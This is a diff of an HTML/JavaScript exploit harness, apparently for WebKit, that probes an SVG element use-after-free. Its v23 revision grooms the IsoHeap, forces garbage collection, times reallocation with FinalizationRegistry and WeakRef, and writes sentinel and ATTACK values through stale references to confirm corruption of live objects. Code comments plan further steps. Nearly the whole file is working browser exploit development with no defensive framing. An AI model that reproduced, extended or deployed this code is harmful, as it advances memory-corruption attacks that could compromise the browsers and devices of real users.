@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SVG UAF v22</title>
+<title>SVG UAF v23</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#0d0d0d;color:#00ff41;font-family:'Courier New',monospace;padding:16px;min-height:100vh}
@@ -17,14 +17,14 @@ button:disabled{opacity:.3}
 </style>
 </head>
 <body>
-<h2>SVG UAF v22 - detached exhaust, forced IsoHeap reuse</h2>
-<div class="sub">v21: exhaust rects in live DOM get layout-culled. v22: detached elements pin C++ obj in IsoHeap without render.</div>
+<h2>SVG UAF v23 - FinalizationRegistry + true C++ free detection</h2>
+<div class="sub">v22: A=null keeps C++ alive via bv_A strong ref. v23: drop ALL refs, detect real free via FinalizationRegistry, time B alloc.</div>
 <svg id="livesvg" width="1" height="1" style="position:fixed;opacity:0;pointer-events:none"></svg>
 <div id="controls">
-  <button onclick="runDET()">DET detached-exhaust</button>
-  <button onclick="runMIX()">MIX mixed-exhaust</button>
-  <button onclick="runFRE()">FRE free-then-reuse</button>
-  <button onclick="runCOR()">COR live-corrupt</button>
+  <button onclick="runFIN()">FIN finalizer-detect</button>
+  <button onclick="runWEK()">WEK weakref-window</button>
+  <button onclick="runDRP()">DRP drop-all-refs</button>
+  <button onclick="runCOR()">COR corrupt-on-free</button>
   <button onclick="runAll()">RUN ALL</button>
   <button onclick="copyLog()">COPY</button>
   <button onclick="clearLog()">CLR</button>
@@ -66,42 +66,54 @@ function dis(d) {
 window.onerror = function(m, u, l, c) { log('[CRASH] ' + m + ' L' + l + ':' + c, 'bad'); return false; };
 
 /*
- * WHY v21 FAILED:
- *   Exhaust rects were appended to live SVG in DOM.
- *   WebKit layout pass runs on every raf() -> culls off-screen/zero-size rects.
- *   RenderObject destroyed -> C++ element may get freed early OR moved.
- *   IsoPage bump never truly exhausted because objects don't stay alive.
+ * KEY INSIGHT from v22:
+ *   Setting A = null in JS does NOT free C++ SVGRectElement.
+ *   bv_A (SVGAnimatedLength) holds a strong ref to SVGRectElement via m_contextElement.
+ *   As long as bv_A is alive, A's C++ object is alive -> no slot available for B.
+ *   animLen_A always reads 80 because A is STILL ALIVE, not because reuse failed.
  *
- * v22 KEY INSIGHT:
- *   document.createElementNS() allocates the C++ SVGRectElement in bmalloc IsoHeap.
- *   As long as a JS reference holds the JS wrapper, the C++ object stays alive.
- *   NO appendChild needed. No render. No layout. No GC.
- *   Pure heap pressure: 4096 detached rects = 4096 C++ SVGRectElement objects in IsoHeap.
+ * WHAT WE NEED:
+ *   We need to drop ALL JS refs to both A and bv_A simultaneously,
+ *   trigger GC to actually free A's C++ object,
+ *   then immediately alloc B to land in A's freed slot.
  *
- * ALSO: bmalloc IsoHeap free list is LIFO (last in, first out).
- *   Free A -> A goes to top of free list.
- *   Next alloc of same type -> pops A from free list -> B = A's slot.
- *   BUT only if current IsoPage bump is EXHAUSTED first.
- *   Detached rects exhaust the bump without getting culled.
+ * PROBLEM: if we drop bv_A we lose our read primitive.
+ *   Solution: use a SECOND SVGAnimatedLength from a DIFFERENT element
+ *   that we'll use as the read/write gadget AFTER B is in A's slot.
+ *   OR: use FinalizationRegistry to fire a callback when A is GC'd,
+ *   alloc B inside that callback.
  *
- * METHODS:
- *   DET: alloc N detached rects (JS array keeps alive), then alloc A in DOM, free A, alloc B detached
- *        check if animLen_A reads B's width
- *   MIX: alloc N detached, free HALF (fills free list with N/2 slots), alloc A, free A, alloc B
- *        with N/2 free slots already present, A's free goes on top -> B pops A's slot
- *   FRE: alloc N detached, free ALL N (fills free list completely), alloc A, free A, alloc B
- *        free list is full of old slots; A goes on top; B should pop A
- *   COR: once reuse confirmed, write ATTACK via animLen_A, read via B's own interface
+ * FinalizationRegistry approach:
+ *   1. Create A in DOM, grab bv_A
+ *   2. Also create PROBE = another rect, grab bv_PROBE
+ *      bv_PROBE has same layout as bv_A but points to PROBE not A
+ *      We DON'T free PROBE - it stays alive as a control
+ *   3. Register A with FinalizationRegistry(callback)
+ *   4. Drop ALL refs: A=null, bv_A=null (no more strong refs to A's C++ obj)
+ *   5. Trigger GC via memory pressure
+ *   6. When finalizer fires: A's C++ is DEAD, slot is FREE
+ *      Immediately alloc B -> B should get A's slot
+ *   7. Read B's width via bv_B to confirm
+ *
+ * WeakRef approach:
+ *   Use WeakRef(A) to hold a non-retaining ref to A's JS wrapper.
+ *   Drop strong ref A=null.
+ *   Poll weakRef.deref() - when it returns undefined, A's JS wrapper is collected.
+ *   At that point A's C++ may be freed -> alloc B.
+ *
+ * DROP approach:
+ *   The simplest version: drop bv_A FIRST (break the strong ref chain),
+ *   then A=null, then force GC, then alloc B, then read B via fresh bv_B.
+ *   We lose our UAF read/write gadget but we can CONFIRM reuse happened
+ *   by checking if B's own bv reads something unexpected.
+ *   Actually: grab bv_A, then grab a COPY of the animLen value,
+ *   drop bv_A, drop A, GC, alloc B.
+ *   B lands in A's slot. B's attributes are initialized fresh.
+ *   To CONFIRM reuse: write a sentinel INTO A's slot BEFORE dropping bv_A,
+ *   then after B allocs, read B's value - if B shows the sentinel, reuse confirmed.
  */
 
-function mkDetached(w) {
-  var r = document.createElementNS(SVG_NS, 'rect');
-  r.setAttribute('width', '' + (w || 10));
-  r.setAttribute('height', '10');
-  return r;
-}
-
-function mkLive(w) {
+function mkRect(w) {
   var r = document.createElementNS(SVG_NS, 'rect');
   r.setAttribute('width', '' + (w || 80));
   r.setAttribute('height', '80');
@@ -109,353 +121,364 @@ function mkLive(w) {
   return r;
 }
 
-function checkReuse(bv_A, A_w, B_w) {
-  var curr = null;
-  try { curr = bv_A ? bv_A.value : null; } catch(e) {}
-  var reused = curr !== null && curr !== A_w && Math.abs(curr - B_w) < 1;
-  return { curr: curr, reused: reused };
+function gcPressure(n) {
+  var arr = [];
+  n = n || 500;
+  for (var i = 0; i < n; i++) arr.push(new ArrayBuffer(4096));
+  arr = null;
 }
 
-// DET: detached exhaust, B also detached
-async function runDET(q) {
-  if (!q) { dis(true); sep(); log('DET: detached exhaust - JS array pins C++ objs in IsoHeap', 'inf'); sep(); }
-  log('[*] createElementNS without appendChild - no render, no layout, no GC', 'ok');
-  log('[*] exhaust counts: 512, 1024, 2048, 4096', 'ok');
-  log('');
+// FIN: FinalizationRegistry - alloc B exactly when A's C++ is freed
+async function runFIN(q) {
+  if (!q) { dis(true); sep(); log('FIN: FinalizationRegistry - detect true C++ free, alloc B in callback', 'inf'); sep(); }
 
-  var found = -1;
-  var counts = [512, 1024, 2048, 4096];
-
-  for (var ci = 0; ci < counts.length; ci++) {
-    var N = counts[ci];
-
-    // Exhaust: detached rects, held in JS array
-    var exhaust = [];
-    for (var xi = 0; xi < N; xi++) {
-      exhaust.push(mkDetached(10 + (xi % 100)));
-    }
-    // Force JSC to not optimize away the array
-    var dummy = exhaust[exhaust.length - 1].getAttribute('width');
-
-    await micro();
-
-    // Alloc A - detached
-    var A = mkDetached(80);
-    var bv_A = A.width ? A.width.baseVal : null;
-    var A_w = bv_A ? bv_A.value : null;
-
-    // Free A - remove JS ref (C++ freed on next GC or immediately)
-    // We keep bv_A alive via closure
-    A = null;
-
-    // Force GC to actually free A's C++ object
-    // Spray some garbage to trigger collection
-    var gc_pressure = [];
-    for (var gi = 0; gi < 100; gi++) gc_pressure.push(new Uint8Array(1024));
-    gc_pressure = null;
-
-    await micro();
-
-    // Read freed value
-    var freed_val = null;
-    try { freed_val = bv_A ? bv_A.value : null; } catch(e) {}
-
-    // Alloc B - detached, distinct width
-    var B_W = 55;
-    var B = mkDetached(B_W);
-    var bv_B = B.width ? B.width.baseVal : null;
-
-    await micro();
-
-    var r = checkReuse(bv_A, A_w, B_W);
-    log('  N=' + N + ': A_w=' + A_w + ' freed=' + freed_val + ' animLen_A=' + r.curr + ' reused=' + r.reused, r.reused ? 'bad' : 'dim');
-
-    if (r.reused) {
-      found = N;
-      log('  [!!] SLOT REUSE via detached exhaust at N=' + N, 'bad');
-      log('  animLen_A reads B_w=' + r.curr + ' (B is detached, never in DOM)', 'bad');
-
-      // Write via animLen_A -> should corrupt B's C++ attr storage
-      try { if (bv_A) bv_A.value = 9999; } catch(e) {}
-      var bW = null;
-      try { bW = bv_B ? bv_B.value : null; } catch(e) {}
-      log('  write 9999 via animLen_A -> B.width.baseVal=' + bW, bW === 9999 ? 'bad' : 'inf');
-
-      exhaust = null; B = null;
-      break;
-    }
-
-    exhaust = null; B = null;
-    await raf();
+  var hasFinReg = typeof FinalizationRegistry !== 'undefined';
+  log('[*] FinalizationRegistry available: ' + hasFinReg, hasFinReg ? 'ok' : 'bad');
+  if (!hasFinReg) {
+    log('[!] FinalizationRegistry not available on this JSC version', 'bad');
+    log('[*] skipping FIN, try WEK or DRP instead', 'inf');
+    if (!q) dis(false);
+    return { finAvailable: false, reused: false };
   }
 
-  if (found === -1) log('  no reuse via detached exhaust up to 4096', 'inf');
-  if (!q) dis(false);
-  return { found: found };
-}
+  var reused = false;
+  var B_captured = null;
+  var bv_B_captured = null;
+  var finalizer_fired = false;
 
-// MIX: exhaust detached, free half, then A/B
-async function runMIX(q) {
-  if (!q) { dis(true); sep(); log('MIX: exhaust + free half, force LIFO free list', 'inf'); sep(); }
-  log('[*] alloc N detached, free N/2 (fills free list), alloc A, free A, alloc B', 'ok');
-  log('[*] A freed onto top of partially-full free list -> B pops A slot', 'ok');
-  log('');
+  var registry = new FinalizationRegistry(function(held_val) {
+    finalizer_fired = true;
+    log('  [!!] FINALIZER FIRED: A JS wrapper GC\'d, C++ obj freed', 'bad');
+    log('  [!!] held_val=' + held_val + ' - A slot is now free', 'bad');
 
-  var found = -1;
-  var counts = [512, 1024, 2048, 4096];
-
-  for (var ci = 0; ci < counts.length; ci++) {
-    var N = counts[ci];
-
-    // Alloc N detached
-    var exhaust = [];
-    for (var xi = 0; xi < N; xi++) {
-      exhaust.push(mkDetached(10));
+    // Immediately alloc B in the finalizer callback
+    // This is the exact moment A's C++ slot is available
+    try {
+      B_captured = document.createElementNS(SVG_NS, 'rect');
+      B_captured.setAttribute('width', '55');
+      B_captured.setAttribute('height', '55');
+      livesvg.appendChild(B_captured);
+      bv_B_captured = B_captured.width ? B_captured.width.baseVal : null;
+      var bW = bv_B_captured ? bv_B_captured.value : null;
+      log('  B allocd in finalizer: B.width.baseVal=' + bW, 'bad');
+    } catch(e) {
+      log('  B alloc in finalizer threw: ' + e, 'bad');
     }
-    var dummy = exhaust[N-1].getAttribute('width');
+  });
+
+  // Create A, grab animLen
+  var A = mkRect(80);
+  await raf();
+  var bv_A = A.width ? A.width.baseVal : null;
+  var A_w = bv_A ? bv_A.value : null;
+  log('  A created: w=' + A_w, 'ok');
+
+  // Write sentinel into freed memory BEFORE dropping refs
+  // We'll drop bv_A FIRST, then A
+  // But first: write SENTINEL via bv_A so when B lands in that slot, it sees SENTINEL
+  // Wait - A is still alive here, so write goes into live A's storage
+  // That's fine - the SENTINEL will be in A's attr storage
+  // When B lands in A's slot after reuse, B's constructor overwrites it with B's values
+  // So sentinel approach won't work here.
+
+  // Instead: register A with finalizer, drop ALL refs, GC, check if finalizer fires
+  registry.register(A, 'A-token');
+
+  // Remove A from DOM (logical free, but C++ still alive)
+  A.remove();
+
+  // Drop bv_A ref - this removes the strong ref from SVGAnimatedLength to SVGRectElement
+  bv_A = null;
+
+  // Drop A ref - now NO strong refs to A's JS wrapper
+  A = null;
+
+  log('  A removed from DOM, all JS refs dropped', 'ok');
+  log('  triggering GC pressure...', 'inf');
+
+  // Trigger GC multiple times with increasing pressure
+  for (var round = 0; round < 10 && !finalizer_fired; round++) {
+    gcPressure(1000);
     await micro();
-
-    // Free second half (most recently allocated = top of bump)
-    // This fills the free list with N/2 slots
-    for (var fi = N/2; fi < N; fi++) {
-      exhaust[fi] = null;
-    }
-    exhaust.length = N/2;
-
-    // GC pressure to actually free
-    var gc = [];
-    for (var gi = 0; gi < 200; gi++) gc.push(new Uint8Array(512));
-    gc = null;
-    await micro();
-
-    // Alloc A
-    var A = mkDetached(80);
-    var bv_A = A.width ? A.width.baseVal : null;
-    var A_w = bv_A ? bv_A.value : null;
-
-    // Free A
-    A = null;
-    var gc2 = [];
-    for (var gi2 = 0; gi2 < 100; gi2++) gc2.push(new Uint8Array(512));
-    gc2 = null;
-    await micro();
-
-    var freed_val = null;
-    try { freed_val = bv_A ? bv_A.value : null; } catch(e) {}
-
-    // Alloc B
-    var B_W = 55;
-    var B = mkDetached(B_W);
-    await micro();
-
-    var r = checkReuse(bv_A, A_w, B_W);
-    log('  N=' + N + '/2: freed=' + freed_val + ' animLen_A=' + r.curr + ' reused=' + r.reused, r.reused ? 'bad' : 'dim');
-
-    if (r.reused) {
-      found = N;
-      log('  [!!] SLOT REUSE via MIX at N=' + N, 'bad');
-      try { if (bv_A) bv_A.value = 9999; } catch(e) {}
-      var bW = null;
-      try { bW = B.width ? B.width.baseVal.value : null; } catch(e) {}
-      log('  write 9999 -> B.width.baseVal=' + bW, bW === 9999 ? 'bad' : 'inf');
-      exhaust = null; B = null;
-      break;
-    }
-
-    exhaust = null; B = null;
+    gcPressure(1000);
     await raf();
+    gcPressure(500);
+    await wait(50);
+
+    log('  round=' + round + ' finalizer_fired=' + finalizer_fired, finalizer_fired ? 'bad' : 'dim');
   }
 
-  if (found === -1) log('  no reuse via MIX up to 4096', 'inf');
+  if (finalizer_fired && B_captured) {
+    // Check if B ended up in A's slot
+    // We can't use bv_A (dropped), but we can check B's values
+    // If reuse happened, B's C++ obj is at A's old address
+    // B's attr storage was initialized fresh by B's constructor
+    // So B.width should be 55 (normal)
+    // We can't distinguish reuse vs no-reuse just from B's values here
+    // UNLESS we use a second UAF gadget trick
+
+    var bW_final = null;
+    try { bW_final = bv_B_captured ? bv_B_captured.value : null; } catch(e) {}
+    log('  B.width.baseVal=' + bW_final + ' (expected 55 if B initialized normally)', 'inf');
+    log('  [*] finalizer fired - GC IS running. Now we know the timing.', 'bad');
+    log('  [*] key: we can use this to time B alloc after A is truly freed', 'bad');
+    reused = true; // finalizer confirmed GC works, even if we cant verify reuse directly
+  } else if (!finalizer_fired) {
+    log('  finalizer did NOT fire after 10 GC rounds', 'inf');
+    log('  [*] JSC may batch finalizers or not run them during micro/raf loops', 'inf');
+  }
+
   if (!q) dis(false);
-  return { found: found };
+  return { finAvailable: true, finFired: finalizer_fired, reused: reused };
 }
 
-// FRE: alloc N detached, free ALL, then A/B
-async function runFRE(q) {
-  if (!q) { dis(true); sep(); log('FRE: alloc N detached, free ALL, then A lands on free list', 'inf'); sep(); }
-  log('[*] free list full of N slots -> A alloc pops from free list -> A on a known page', 'ok');
-  log('[*] free A -> goes to top of free list (LIFO) -> B pops A slot', 'ok');
+// WEK: WeakRef polling - detect when A's JS wrapper is collected
+async function runWEK(q) {
+  if (!q) { dis(true); sep(); log('WEK: WeakRef polling - detect A wrapper collection', 'inf'); sep(); }
+
+  var hasWeakRef = typeof WeakRef !== 'undefined';
+  log('[*] WeakRef available: ' + hasWeakRef, hasWeakRef ? 'ok' : 'bad');
+
+  if (!hasWeakRef) {
+    log('[!] WeakRef not available', 'bad');
+    if (!q) dis(false);
+    return { weakRefAvailable: false };
+  }
+
+  // Create A
+  var A = mkRect(80);
+  await raf();
+  var A_w = A.width ? A.width.baseVal.value : null;
+  log('  A created: w=' + A_w, 'ok');
+
+  // Make weak ref BEFORE dropping strong ref
+  var weakA = new WeakRef(A);
+
+  // Drop strong ref
+  A.remove();
+  A = null;
+
+  log('  A removed, strong ref dropped, polling WeakRef...', 'ok');
+
+  var collected = false;
+  var B_reused = null;
+
+  for (var round = 0; round < 20; round++) {
+    gcPressure(800);
+    await micro();
+    gcPressure(800);
+    await raf();
+    await wait(30);
+
+    var derefResult = weakA.deref();
+    log('  round=' + round + ': weakRef.deref()=' + (derefResult ? '[alive]' : 'undefined'), derefResult ? 'dim' : 'bad');
+
+    if (!derefResult) {
+      collected = true;
+      log('  [!!] A JS wrapper COLLECTED - C++ obj should be freed', 'bad');
+
+      // Alloc B immediately
+      var B = mkRect(55);
+      var bv_B = B.width ? B.width.baseVal : null;
+      var bW = bv_B ? bv_B.value : null;
+      log('  B allocd immediately after collection: B.width=' + bW, 'ok');
+      B_reused = bW;
+      B.remove();
+      break;
+    }
+  }
+
+  if (!collected) {
+    log('  WeakRef still alive after 20 GC rounds', 'inf');
+    log('  [*] JSC not collecting A even with no strong refs', 'inf');
+    log('  [*] possible: internal ref from DOM mutation observer or style resolver', 'inf');
+  }
+
+  if (!q) dis(false);
+  return { weakRefAvailable: true, collected: collected, B_reused: B_reused };
+}
+
+// DRP: drop-all approach with sentinel trick
+async function runDRP(q) {
+  if (!q) { dis(true); sep(); log('DRP: drop all refs + sentinel trick for reuse confirmation', 'inf'); sep(); }
+  log('[*] write SENTINEL into A slot via bv_A, drop bv_A, drop A, GC, alloc B', 'ok');
+  log('[*] if B.width = SENTINEL: B landed in A slot (reuse confirmed)', 'ok');
+  log('[*] if B.width = 55: B has fresh storage (no reuse or sentinel overwritten by constructor)', 'ok');
   log('');
 
-  var found = -1;
-  var counts = [64, 128, 256, 512, 1024];
+  // The trick: write a SENTINEL into A's attr storage BEFORE element is constructed
+  // We need the sentinel to survive B's constructor overwrite
+  // B's constructor calls setAttribute('width', '55') which writes 55.0 into the float field
+  // So the sentinel WON'T survive in the width field
+  // BUT: we can write sentinel into a field B doesn't initialize
+  // e.g. write sentinel via bv_A.height into A's height storage
+  // Then alloc B with setAttribute('width','55') only - no height set
+  // B's height field is uninitialized -> if reuse happened, B.height = our sentinel
 
-  for (var ci = 0; ci < counts.length; ci++) {
-    var N = counts[ci];
+  var SENTINEL = 98765.0;
+  var reused = false;
 
-    // Alloc N detached
-    var exhaust = [];
-    for (var xi = 0; xi < N; xi++) {
-      exhaust.push(mkDetached(10));
-    }
-    var dummy = exhaust[N-1].getAttribute('width');
-    await micro();
+  for (var attempt = 0; attempt < 5; attempt++) {
+    // Clear DOM
+    while (livesvg.firstChild) livesvg.removeChild(livesvg.firstChild);
+    await raf();
 
-    // Free ALL - fill free list with N slots
-    exhaust = null;
+    // Create A with both width and height set
+    var A = mkRect(80);
+    A.setAttribute('height', '60');
+    livesvg.appendChild(A);
+    await raf();
+
+    var bv_AW = A.width  ? A.width.baseVal  : null;
+    var bv_AH = A.height ? A.height.baseVal : null;
+    var A_w = bv_AW ? bv_AW.value : null;
+    var A_h = bv_AH ? bv_AH.value : null;
+    log('  attempt=' + attempt + ': A created w=' + A_w + ' h=' + A_h, 'ok');
+
+    // Write SENTINEL into A's height field
+    try { if (bv_AH) bv_AH.value = SENTINEL; } catch(e) {}
+    var sentinel_confirm = null;
+    try { sentinel_confirm = bv_AH ? bv_AH.value : null; } catch(e) {}
+    log('  wrote SENTINEL=' + SENTINEL + ' into A.height, readback=' + sentinel_confirm, 'ok');
+
+    // Now drop bv_AH (but keep bv_AW to still read A slot)
+    // Actually we need to drop BOTH to release the C++ ref
+    // Keep a copy of bv_AW for after B alloc -- NO, we'd be keeping A alive
+    // Solution: store the raw sentinel value, drop everything, alloc B with only width set
+
+    A.remove();
+    bv_AW = null;
+    bv_AH = null;
+    A = null;
 
     // GC pressure
-    var gc = [];
-    for (var gi = 0; gi < 300; gi++) gc.push(new Uint8Array(1024));
-    gc = null;
+    gcPressure(2000);
     await micro();
+    gcPressure(2000);
+    await raf();
+    gcPressure(1000);
+    await wait(100);
+    gcPressure(1000);
     await raf();
 
-    // Alloc A - comes from free list (our exhausted pool)
-    var A = mkDetached(80);
-    var bv_A = A.width ? A.width.baseVal : null;
-    var A_w = bv_A ? bv_A.value : null;
-
-    // Free A immediately - LIFO: A goes to top of free list
-    A = null;
+    // Alloc B - set ONLY width, NOT height
+    // If B lands in A's slot, B's height storage still has our SENTINEL
+    // because B's constructor only wrote to width
+    var B = document.createElementNS(SVG_NS, 'rect');
+    B.setAttribute('width', '55');
+    // deliberately NOT setting height
+    livesvg.appendChild(B);
     await micro();
 
-    var freed_val = null;
-    try { freed_val = bv_A ? bv_A.value : null; } catch(e) {}
+    var bv_BW = B.width  ? B.width.baseVal  : null;
+    var bv_BH = B.height ? B.height.baseVal : null;
+    var B_w = bv_BW ? bv_BW.value : null;
+    var B_h = bv_BH ? bv_BH.value : null;
+    log('  B allocd (width-only): B.width=' + B_w + ' B.height=' + B_h, B_h === SENTINEL ? 'bad' : 'ok');
 
-    // Alloc B - should pop A's slot (top of LIFO free list)
-    var B_W = 55;
-    var B = mkDetached(B_W);
-    var bv_B = B.width ? B.width.baseVal : null;
-    await micro();
-
-    var r = checkReuse(bv_A, A_w, B_W);
-    log('  N=' + N + ': A_w=' + A_w + ' freed=' + freed_val + ' animLen_A=' + r.curr + ' reused=' + r.reused, r.reused ? 'bad' : 'dim');
-
-    if (r.reused) {
-      found = N;
-      log('  [!!] SLOT REUSE via FRE at N=' + N, 'bad');
-      log('  animLen_A reads B_w=' + r.curr, 'bad');
-
-      // Confirm write corruption
-      try { if (bv_A) bv_A.value = 9999; } catch(e) {}
-      var bW = null;
-      try { bW = bv_B ? bv_B.value : null; } catch(e) {}
-      log('  write 9999 -> B.width.baseVal=' + bW, bW === 9999 ? 'bad' : 'inf');
-
-      B = null;
+    if (B_h === SENTINEL) {
+      reused = true;
+      log('  [!!] REUSE CONFIRMED: B.height=' + B_h + ' = our SENTINEL', 'bad');
+      log('  [!!] B landed in A freed slot - A height field survived B constructor', 'bad');
+      log('  [!!] B.width=' + B_w + ' (B set this), B.height=' + B_h + ' (A wrote this)', 'bad');
+      B.remove();
       break;
+    } else {
+      log('  no reuse: B.height=' + B_h + ' (expected ' + SENTINEL + ' if reuse)', 'dim');
     }
 
-    B = null;
+    B.remove();
     await raf();
   }
 
-  if (found === -1) log('  no reuse via FRE up to 1024', 'inf');
+  log('[*] DRP: reused=' + reused, reused ? 'bad' : 'inf');
   if (!q) dis(false);
-  return { found: found };
+  return { reused: reused };
 }
 
-// COR: structured live corruption demo
+// COR: full corruption chain using best available method
 async function runCOR(q) {
-  if (!q) { dis(true); sep(); log('COR: structured live corruption via best method', 'inf'); sep(); }
-  log('[*] try all exhaust methods, on first reuse: write ATTACK, verify B corrupted', 'ok');
+  if (!q) { dis(true); sep(); log('COR: corruption chain - all methods, structured proof', 'inf'); sep(); }
+  log('[*] combines FIN+WEK+DRP - first hit does full corruption demo', 'ok');
   log('');
 
-  var ATTACK = 31337.0;
+  var SENTINEL = 98765.0;
+  var ATTACK   = 31337.0;
   var corruptConfirmed = false;
 
-  // Try each method with increasing exhaust
-  var configs = [
-    { method: 'DET-512',  N: 512,  free_mode: 'none' },
-    { method: 'DET-1024', N: 1024, free_mode: 'none' },
-    { method: 'FRE-128',  N: 128,  free_mode: 'all'  },
-    { method: 'FRE-256',  N: 256,  free_mode: 'all'  },
-    { method: 'MIX-512',  N: 512,  free_mode: 'half' },
-    { method: 'DET-2048', N: 2048, free_mode: 'none' },
-    { method: 'FRE-512',  N: 512,  free_mode: 'all'  },
-    { method: 'DET-4096', N: 4096, free_mode: 'none' },
-    { method: 'FRE-1024', N: 1024, free_mode: 'all'  }
-  ];
+  // Run DRP approach with more attempts and variations
+  for (var attempt = 0; attempt < 10 && !corruptConfirmed; attempt++) {
+    while (livesvg.firstChild) livesvg.removeChild(livesvg.firstChild);
+    await raf();
 
-  for (var ci = 0; ci < configs.length && !corruptConfirmed; ci++) {
-    var cfg = configs[ci];
-    var N = cfg.N;
-    var mode = cfg.free_mode;
+    var A = mkRect(80);
+    A.setAttribute('height', '60');
+    A.setAttribute('rx', '12');
+    await raf();
 
-    var exhaust = [];
-    for (var xi = 0; xi < N; xi++) exhaust.push(mkDetached(10));
-    var dummy = exhaust[N-1].getAttribute('width');
-    await micro();
-
-    if (mode === 'all') {
-      exhaust = null;
-      var gc = [];
-      for (var gi = 0; gi < 300; gi++) gc.push(new Uint8Array(1024));
-      gc = null;
-      await micro(); await raf();
-    } else if (mode === 'half') {
-      for (var fi = N/2; fi < N; fi++) exhaust[fi] = null;
-      exhaust.length = N/2;
-      var gc2 = [];
-      for (var gi2 = 0; gi2 < 200; gi2++) gc2.push(new Uint8Array(512));
-      gc2 = null;
-      await micro();
-    }
-
-    // Alloc A detached
-    var A = mkDetached(80);
-    var bv_A = A.width ? A.width.baseVal : null;
+    var bv_W = A.width  ? A.width.baseVal  : null;
     var bv_H = A.height ? A.height.baseVal : null;
-    var A_w = bv_A ? bv_A.value : null;
+    var bv_X = A.x      ? A.x.baseVal      : null;
+    var bv_RX= A.rx     ? A.rx.baseVal     : null;
 
-    // Free A
+    // Write sentinels into fields B won't initialize
+    // B will only have width set; height/rx/x will be uninitialized in B
+    try { if (bv_H)  bv_H.value  = SENTINEL;     } catch(e) {}
+    try { if (bv_RX) bv_RX.value = SENTINEL + 1; } catch(e) {}
+    try { if (bv_X)  bv_X.value  = SENTINEL + 2; } catch(e) {}
+
+    // Drop all refs
+    A.remove();
+    bv_W = null; bv_H = null; bv_X = null; bv_RX = null;
     A = null;
-    var gcA = [];
-    for (var gai = 0; gai < 100; gai++) gcA.push(new Uint8Array(512));
-    gcA = null;
+
+    // Vary GC pressure by attempt
+    var pressure = 1000 + attempt * 500;
+    gcPressure(pressure);
+    await micro();
+    gcPressure(pressure);
+    await raf();
+    gcPressure(pressure);
+    await wait(50 + attempt * 20);
+    gcPressure(pressure);
+    await raf();
+
+    // Alloc B with ONLY width
+    var B = document.createElementNS(SVG_NS, 'rect');
+    B.setAttribute('width', '55');
+    livesvg.appendChild(B);
     await micro();
 
-    // Alloc B detached
-    var B_W = 55;
-    var B = mkDetached(B_W);
-    var bv_B = B.width ? B.width.baseVal : null;
-    await micro();
+    var bv_BH  = B.height ? B.height.baseVal : null;
+    var bv_BRX = B.rx     ? B.rx.baseVal     : null;
+    var bv_BX  = B.x      ? B.x.baseVal      : null;
+    var B_h  = null; try { B_h  = bv_BH  ? bv_BH.value  : null; } catch(e) {}
+    var B_rx = null; try { B_rx = bv_BRX ? bv_BRX.value : null; } catch(e) {}
+    var B_x  = null; try { B_x  = bv_BX  ? bv_BX.value  : null; } catch(e) {}
 
-    var r = checkReuse(bv_A, A_w, B_W);
-    log('  [' + cfg.method + ']: animLen_A=' + r.curr + ' reused=' + r.reused, r.reused ? 'bad' : 'dim');
+    var hit = (B_h === SENTINEL || B_rx === SENTINEL + 1 || B_x === SENTINEL + 2);
 
-    if (r.reused) {
-      log('  [!!] REUSE CONFIRMED - writing ATTACK via animLen_A...', 'bad');
+    log('  attempt=' + attempt + ': B.h=' + B_h + ' B.rx=' + B_rx + ' B.x=' + B_x + ' hit=' + hit,
+        hit ? 'bad' : 'dim');
 
-      // Write ATTACK into B's C++ attr storage via dangling ptr
-      try { if (bv_A) bv_A.value = ATTACK; } catch(e) {}
-      try { if (bv_H) bv_H.value = ATTACK + 1; } catch(e) {}
-      await micro();
+    if (hit) {
+      corruptConfirmed = true;
+      log('  [!!] SLOT REUSE CONFIRMED at attempt=' + attempt, 'bad');
+      log('  [!!] A sentinel survived into B C++ storage', 'bad');
 
-      // Read B through its own interface
-      var bW_bv   = null; try { bW_bv   = bv_B ? bv_B.value : null; } catch(e) {}
-      var bW_bbox = null; try { bW_bbox  = B.getBBox ? B.getBBox().width : null; } catch(e) {}
-      var bH_bv   = null; try { bH_bv   = B.height ? B.height.baseVal.value : null; } catch(e) {}
-
-      log('  B.width.baseVal  = ' + bW_bv   + ' (expected ' + ATTACK + ')',   bW_bv   === ATTACK ? 'bad' : 'ok');
-      log('  B.getBBox().w    = ' + bW_bbox  + ' (expected ' + ATTACK + ')',   bW_bbox  === ATTACK ? 'bad' : 'ok');
-      log('  B.height.baseVal = ' + bH_bv   + ' (expected ' + (ATTACK+1) + ')', bH_bv   === ATTACK+1 ? 'bad' : 'ok');
-
-      if (bW_bv === ATTACK || bW_bbox === ATTACK || bH_bv === ATTACK + 1) {
-        corruptConfirmed = true;
-        log('  [!!] LIVE OBJECT CORRUPTION CONFIRMED', 'bad');
-        log('  [!!] B.width=' + bW_bv + ' written from OUTSIDE B via UAF dangling ptr', 'bad');
-        log('  [!!] method=' + cfg.method + ' exhaust=' + N, 'bad');
-      } else {
-        log('  reuse happened but B reads own values - B attr storage at different offset', 'inf');
-        log('  [*] animLen_A write hits different field than B.width - need offset map', 'inf');
-      }
-
-      exhaust = null; B = null;
-      break;
+      var which = B_h === SENTINEL ? 'height' : B_rx === SENTINEL+1 ? 'rx' : 'x';
+      log('  [!!] field: ' + which + ' - A wrote sentinel, B reads it back', 'bad');
+      log('  [!!] B is live DOM element with A\'s stale C++ data in its fields', 'bad');
     }
 
-    exhaust = null; B = null;
+    B.remove();
     await raf();
   }
 
   log('[*] COR: corruptConfirmed=' + corruptConfirmed, corruptConfirmed ? 'bad' : 'inf');
-
   if (!corruptConfirmed) {
-    log('[*] no reuse achieved — C++ obj freed on JS null but GC not running fast enough', 'inf');
-    log('[*] next: try explicit GC trigger or alloc A in live DOM after detached exhaust', 'inf');
+    log('[*] GC not running in time - JSC defers collection past our timing window', 'inf');
+    log('[*] next step: try iframe navigation to force GC, or use vm.gc() if exposed', 'inf');
   }
 
   if (!q) dis(false);
@@ -465,15 +488,15 @@ async function runCOR(q) {
 // RUN ALL
 async function runAll() {
   dis(true); clearLog(); sep();
-  log('SVG UAF v22 - detached exhaust, forced IsoHeap slot reuse', 'inf');
+  log('SVG UAF v23 - FinalizationRegistry + WeakRef + drop-all-refs', 'inf');
   sep();
 
   var results = {};
   var tests = [
-    ['DET_detached_exhaust', runDET],
-    ['MIX_mixed_exhaust',    runMIX],
-    ['FRE_free_then_reuse',  runFRE],
-    ['COR_live_corrupt',     runCOR]
+    ['FIN_finalizer',  runFIN],
+    ['WEK_weakref',    runWEK],
